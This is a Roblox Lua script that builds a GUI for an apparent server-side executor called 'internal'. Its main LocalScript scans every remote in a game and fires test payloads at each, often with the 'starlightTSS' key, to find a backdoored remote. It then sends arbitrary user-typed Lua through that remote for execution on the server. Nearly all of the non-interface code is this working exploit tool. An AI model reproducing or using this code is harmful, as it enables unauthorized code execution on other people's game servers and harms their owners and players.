-- internal 0.1 🧩


























































-- Instances:
local Converted = {
	["_internal"] = Instance.new("ScreenGui");
	["_Main"] = Instance.new("Frame");
	["_Frame"] = Instance.new("Frame");
	["_TextLabel"] = Instance.new("TextLabel");
	["_LocalScript"] = Instance.new("LocalScript");
	["_ImageLabel"] = Instance.new("ImageLabel");
	["_TextBox"] = Instance.new("TextBox");
	["_Exec"] = Instance.new("TextButton");
	["_TextButton"] = Instance.new("TextButton");
	["_LocalScript1"] = Instance.new("LocalScript");
	["_LocalScript2"] = Instance.new("LocalScript");
	["_Scan"] = Instance.new("TextButton");
	["_Log"] = Instance.new("TextLabel");
}

-- Properties:

Converted["_internal"].IgnoreGuiInset = true
Converted["_internal"].ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
Converted["_internal"].ResetOnSpawn = false
Converted["_internal"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Converted["_internal"].Name = "internal"
Converted["_internal"].Parent = game:GetService("CoreGui")

Converted["_Main"].AnchorPoint = Vector2.new(0.5, 0.5)
Converted["_Main"].BackgroundColor3 = Color3.fromRGB(20.000000707805157, 21.000000648200512, 31.000000052154064)
Converted["_Main"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Main"].BorderSizePixel = 0
Converted["_Main"].Position = UDim2.new(0.5, 0, 0.5, 0)
Converted["_Main"].Size = UDim2.new(0, 394, 0, 222)
Converted["_Main"].ZIndex = 2
Converted["_Main"].Name = "Main"
Converted["_Main"].Parent = Converted["_internal"]

Converted["_Frame"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 40.00000141561031, 58.00000034272671)
Converted["_Frame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Frame"].BorderSizePixel = 0
Converted["_Frame"].Size = UDim2.new(0, 394, 0, 26)
Converted["_Frame"].Parent = Converted["_Main"]

Converted["_TextLabel"].Font = Enum.Font.Code
Converted["_TextLabel"].Text = " internal"
Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel"].TextSize = 20
Converted["_TextLabel"].TextWrapped = true
Converted["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel"].BackgroundTransparency = 1
Converted["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel"].BorderSizePixel = 0
Converted["_TextLabel"].Size = UDim2.new(0, 394, 0, 26)
Converted["_TextLabel"].Parent = Converted["_Frame"]

Converted["_ImageLabel"].Image = "rbxassetid://6124959303"
Converted["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel"].BackgroundTransparency = 1
Converted["_ImageLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel"].BorderSizePixel = 0
Converted["_ImageLabel"].Position = UDim2.new(0.225443572, 0, 0, 0)
Converted["_ImageLabel"].Rotation = 19
Converted["_ImageLabel"].Size = UDim2.new(0, 26, 0, 26)
Converted["_ImageLabel"].Parent = Converted["_Frame"]

Converted["_TextBox"].CursorPosition = -1
Converted["_TextBox"].Font = Enum.Font.Code
Converted["_TextBox"].PlaceholderText = 'print("Hello, World!")'
Converted["_TextBox"].Text = ""
Converted["_TextBox"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextBox"].TextSize = 14
Converted["_TextBox"].TextTruncate = Enum.TextTruncate.SplitWord
Converted["_TextBox"].TextWrapped = true
Converted["_TextBox"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextBox"].TextYAlignment = Enum.TextYAlignment.Top
Converted["_TextBox"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 40.00000141561031, 58.00000034272671)
Converted["_TextBox"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextBox"].BorderSizePixel = 0
Converted["_TextBox"].Position = UDim2.new(0.0152284261, 0, 0.144144148, 0)
Converted["_TextBox"].Size = UDim2.new(0, 382, 0, 159)
Converted["_TextBox"].Parent = Converted["_Main"]

Converted["_Exec"].Font = Enum.Font.Code
Converted["_Exec"].Text = "Execute"
Converted["_Exec"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Exec"].TextSize = 14
Converted["_Exec"].AutoButtonColor = false
Converted["_Exec"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 40.00000141561031, 58.00000034272671)
Converted["_Exec"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Exec"].BorderSizePixel = 0
Converted["_Exec"].Position = UDim2.new(0.0152284261, 0, 0.887387395, 0)
Converted["_Exec"].Size = UDim2.new(0, 53, 0, 19)
Converted["_Exec"].Name = "Exec"
Converted["_Exec"].Parent = Converted["_Main"]

Converted["_TextButton"].Font = Enum.Font.Code
Converted["_TextButton"].Text = "Clear"
Converted["_TextButton"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextButton"].TextSize = 14
Converted["_TextButton"].AutoButtonColor = false
Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 40.00000141561031, 58.00000034272671)
Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextButton"].BorderSizePixel = 0
Converted["_TextButton"].Position = UDim2.new(0.172588825, 0, 0.887387395, 0)
Converted["_TextButton"].Size = UDim2.new(0, 53, 0, 19)
Converted["_TextButton"].Parent = Converted["_Main"]

Converted["_Scan"].Font = Enum.Font.Code
Converted["_Scan"].Text = "Attach"
Converted["_Scan"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Scan"].TextSize = 14
Converted["_Scan"].AutoButtonColor = false
Converted["_Scan"].BackgroundColor3 = Color3.fromRGB(38.0000015348196, 40.00000141561031, 58.00000034272671)
Converted["_Scan"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Scan"].BorderSizePixel = 0
Converted["_Scan"].Position = UDim2.new(0.332487315, 0, 0.887387395, 0)
Converted["_Scan"].Size = UDim2.new(0, 53, 0, 19)
Converted["_Scan"].Name = "Scan"
Converted["_Scan"].Parent = Converted["_Main"]

Converted["_Log"].Font = Enum.Font.Code
Converted["_Log"].Text = "log."
Converted["_Log"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log"].TextScaled = true
Converted["_Log"].TextSize = 20
Converted["_Log"].TextWrapped = true
Converted["_Log"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_Log"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log"].BackgroundTransparency = 1
Converted["_Log"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Log"].BorderSizePixel = 0
Converted["_Log"].Position = UDim2.new(0.332487315, 0, 0.887387395, 0)
Converted["_Log"].Size = UDim2.new(0, 203, 0, 19)
Converted["_Log"].Visible = false
Converted["_Log"].Name = "Log"
Converted["_Log"].Parent = Converted["_Main"]

-- Fake Module Scripts:

local fake_module_scripts = {}


-- Fake Local Scripts:

local function UIFBZJ_fake_script() -- Fake Script: StarterGui.internal.Main.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Parent.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
local function GISTETD_fake_script() -- Fake Script: StarterGui.internal.Main.TextButton.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_TextButton"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.TextBox.Text = ""
	end)
end
local function ODRYUI_fake_script() -- Fake Script: StarterGui.internal.Main.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Main"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local frame = script.Parent
	local entered=false
	frame.MouseEnter:Connect(function()
		entered=true
		
	end)
	
	frame.MouseLeave:Connect(function()
		entered=false
	end)
	
	game:GetService("RunService").RenderStepped:Connect(function()
		if entered then
			game.Players.LocalPlayer:GetMouse().Icon="rbxassetid://16451571226"
		else
			game.Players.LocalPlayer:GetMouse().Icon=""
		end
	end)
	
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local userInputService = game:GetService("UserInputService")
	local tweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	
	local rs = game:GetService("ReplicatedStorage")
	
	local EXCLUDED_REMOTES = {
		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
		GetServerVersion = true, GetClientId = true, GetInventory = true,
		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
		ReportAbuse = true
	}
	
	local SAFE_LOCATIONS = {
		["CoreGui"] = true,
		["ServerStorage"] = true,
		["ReplicatedFirst"] = true,
		["ServerScriptService"] = true
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local FinishedFound = false
	local scannedRemotes = {}
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local function testRemote(remote, isFunction, timeout)
		if foundExploit or scannedRemotes[remote] then return false end
		scannedRemotes[remote] = true
		if not isLikelyBackdoorRemote(remote) then return false end
	
		local modelName = "internal_"..tostring(math.random(1,999999))
		local foundEvent = false
	
		local connection = rs.DescendantAdded:Connect(function(inst)
			if inst.Name == modelName then
				foundEvent = true
			end
		end)
	
		local function cleanup()
			connection:Disconnect()
			local f = rs:FindFirstChild(modelName)
			if f then f:Destroy() end
		end
	
		local payload = [[
			local m=Instance.new("ObjectValue")
			m.Name="]]..modelName..[["
			m.Parent=game:GetService("ReplicatedStorage")
		]]
	
		local finished = false
	
		task.spawn(function()
			pcall(function()
				if isFunction then
					remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
				else
					remote:FireServer(payload)
				end
			end)
			finished = true
		end)
	
		local start = os.clock()
		while os.clock() - start < timeout do
			if foundEvent or rs:FindFirstChild(modelName) then
				foundEvent = true
				break
			end
			if finished then break end
			task.wait()
		end
	
		cleanup()
	
		if foundEvent and not foundExploit then
			foundExploit = true
			if isFunction then
				remoteFunction = remote
			else
				remoteEvent = remote
			end
			return true
		end
	
		return false
	end
	
	local function fastFindRemote(timeout)
		foundExploit = false
		remoteEvent = nil
		remoteFunction = nil
		scannedRemotes = {}
	
		local remotes = {}
		for _, remote in ipairs(game:GetDescendants()) do
			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
				table.insert(remotes, remote)
			end
		end
	
		print(string.format("internal: 🔍 scanning %d remotes", #remotes))
	
		table.sort(remotes, function(a, b)
			-- sort: sus name/loc first
			local aScore = isLikelyBackdoorRemote(a) and 1 or 0
			local bScore = isLikelyBackdoorRemote(b) and 1 or 0
			return aScore > bScore
		end)
	
		local MAX_CONCURRENT = 128
		local activeTasks = 0
		local taskDone = Instance.new("BindableEvent")
	
		for i = 1, #remotes do
			if foundExploit then break end
	
			while activeTasks >= MAX_CONCURRENT do
				taskDone.Event:Wait()
			end
	
			activeTasks += 1
			task.spawn(function()
				local ok, result = pcall(function()
					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
				end)
	
				if ok and result then
					print("internal: backdoor found:", remotes[i]:GetFullName())
				end
	
				activeTasks -= 1
				taskDone:Fire()
			end)
		end
	
		while activeTasks > 0 and not foundExploit do
			taskDone.Event:Wait()
		end
	
		if not foundExploit then
			print("internal: backdoor not found")
		end
	
		return foundExploit
	end
	
	local function findRemote()
		local trueStart = os.clock()
		local tStart = os.clock()
	
		fastFindRemote(1)
	
		scanTime = os.clock() - trueStart
		FinishedFound = true
		print(string.format("internal: scan completed in %.3f seconds", os.clock() - tStart))
	end
	
	
	local function fireRemoteEvent(code)
		if remoteEvent then
			remoteEvent:FireServer(code)
		elseif remoteFunction then
			pcall(function()
				remoteFunction:InvokeServer('starlightTSS', code)
			end)
		else
			warn("internal: no backdoor, cannot execute code.")
			game.StarterGui:SetCore("SendNotification",{
				Title = "internal",
				Text = "no backdoor found, or you didn't scan! - can't run code.",
				Duration = 12
			})
		end
	end
	local scanning=false
	script.Parent.Scan.Activated:Connect(function()
		if scanning then return end
		scanning = true
		FinishedFound = false
		task.spawn(findRemote)
		script.Parent.Scan.Visible=false
		script.Parent.Log.Visible=true
		script.Parent.Log.Text="scanning..."
		repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
		repeat task.wait() until FinishedFound
	
		if remoteEvent or remoteFunction then
			script.Parent.Log.Text = "backdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown")
	
			game.StarterGui:SetCore("SendNotification",{
				Title = "internal",
				Text = "backdoor found in " .. scanTime .."s! backdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown"),
				Duration = 5
			})
		else
			script.Parent.Log.Text="backdoor not found!"
			wait(3)
			script.Parent.Log.Visible=false
			script.Parent.Scan.Visible=true
		end
	
		scanning = false
	end)
	script.Parent.Exec.Activated:Connect(function()
		fireRemoteEvent(script.Parent.TextBox.Text)
	end)
end

coroutine.wrap(UIFBZJ_fake_script)()
coroutine.wrap(GISTETD_fake_script)()
coroutine.wrap(ODRYUI_fake_script)()
